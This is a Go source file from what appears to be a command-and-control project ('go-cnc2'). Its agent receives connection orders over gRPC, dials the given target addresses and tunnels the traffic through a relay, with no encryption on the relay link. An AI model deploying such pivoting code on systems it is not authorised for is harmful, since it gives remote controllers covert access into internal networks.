package agent

import (
	"context"
	"fmt"
	"io"
	"net"

	"go-cnc2/pkg/common"
	"go-cnc2/pkg/relay"
	pb "go-cnc2/proto/pb"

	logger "github.com/sirupsen/logrus"
	"google.golang.org/grpc"
	"google.golang.org/grpc/metadata"
)

func (a *Agent) HandleConnStream(stream pb.AgentService_CreateConnStreamClient) {
	for {
		pbConn, err := stream.Recv()
		if err != nil {
			logger.Errorf(common.LogfmtErr, common.StrCliAgent, common.StrHandleConnStream, fmt.Sprintf(common.StrErrReadConnStream, err))
			break
		}
		logger.Infof("Received conn to remote addr: %s relay: %s", pbConn.RemoteAddr, pbConn.RelayAddr)

		if pbConn.RemoteAddr == "" {
			logger.Errorf("Empty remote address for connId: %s", pbConn.ConnId)
			continue
		}

		go handleTunnel(pbConn)
	}
}

func handleTunnel(pbConn *pb.AgentConn) {
	// dial the actual target
	tcpConn, err := net.Dial("tcp", pbConn.RemoteAddr)
	if err != nil {
		logger.Errorf("Failed to dial target %s: %v", pbConn.RemoteAddr, err)
		return
	}
	defer tcpConn.Close()

	// dial the relay
	relayConn, err := grpc.Dial(pbConn.RelayAddr, grpc.WithInsecure()) //nolint:staticcheck
	if err != nil {
		logger.Errorf("Failed to dial relay %s: %v", pbConn.RelayAddr, err)
		return
	}
	defer relayConn.Close()

	ctx := metadata.AppendToOutgoingContext(context.Background(), "session_token", pbConn.SessionToken)
	tunnel, err := pb.NewRelayServiceClient(relayConn).Tunnel(ctx)
	if err != nil {
		logger.Errorf("Failed to open tunnel stream: %v", err)
		return
	}

	errCh := make(chan error, 2)
	go func() { _, err := io.Copy(tcpConn, &relay.StreamReader{Stream: tunnel}); errCh <- err }()
	go func() { _, err := io.Copy(relay.StreamWriter{Stream: tunnel}, tcpConn); errCh <- err }()
	<-errCh
}
